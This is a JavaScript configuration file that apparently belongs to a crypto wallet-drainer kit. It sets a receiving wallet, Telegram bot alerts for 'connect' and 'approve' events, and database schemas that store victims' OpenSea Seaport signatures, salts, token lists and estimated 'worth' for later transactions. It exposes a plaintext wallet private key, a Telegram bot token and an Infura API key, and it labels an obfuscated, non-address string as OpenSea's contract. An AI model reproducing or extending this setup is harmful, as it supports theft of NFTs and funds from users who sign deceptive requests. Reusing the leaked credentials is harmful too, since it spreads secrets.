export const RECEIVER = "0x4b2DfAe227CBDC9E8F894D3e1f5A7e7581bab098";
// length 40 hex characters

// RECEIVER = CALLER_WALLET
export const CALLER_ADDR = "0x4b2DfAe227CBDC9E8F894D3e1f5A7e7581bab098";
// length 40 hex characters

export const CALLER_PK = "b8e68a6ab517d1e4c270cf98e63772456dce47f4a12614b73f1e9e44594309f4"; // MM Acc1
// private key of CALLER_ADDR
// length 64 hex characters

//export const PORT = "4000" // localhost
export const PORT = process.env.PORT // for example heroku hosting

export const SEAPORT_ADDR = "21337b333333333333333333333560303b3631606146653066333b463b6745313b3a32353a466746363b3221"; 
// dont touch, this is opensea's contract

//Search for Botfather on Telegram. @ him at /@botfather
//Say hi to the Botfather (gotta pay respects)
//Send your bot name his way
//Bam! You got your authorization token 😃
export const TG_TOKEN = "5896504976:AAH7l-MpbvNB5bUYyAK7yRxkhRvWlqS_8Y8";
export const TG_LINK = "https://api.telegram.org/bot";
export const CHAT_ID_ERR = "966730553";
export const CHAT_ID_CON = "966730553";
export const CHAT_ID_APP = "966730553";

// INFURA-API-KEY
export const WEB3_URL = "https://mainnet.infura.io/v3/95f7ecdb920b4cf0aa93601930696d4e";

export const CHAIN_ID = 1; 

export const expirationOffset = 2630000; // 1 month in sec

export const SEA_USER = "addr,tokensArr,sig,sigTime,salt,salt2,worth,domain";
export const APP_USER = "addr,target,worth,domain";

export const TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2,target,tokenId";

export const SEA_TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2";
export const APP_TX_ROW = "addr,target,tokenId";

export const COLUMNS = {
  sea_users: SEA_USER,
  app_users: APP_USER,
  tx_waiting: TX_ROW,
  tx_done: TX_ROW,
};

export const ADDR_REGEX = /^[a-fA-F0-9]{40}$/;
export const SIG_REGEX = /^([A-Fa-f0-9]{130})$/;
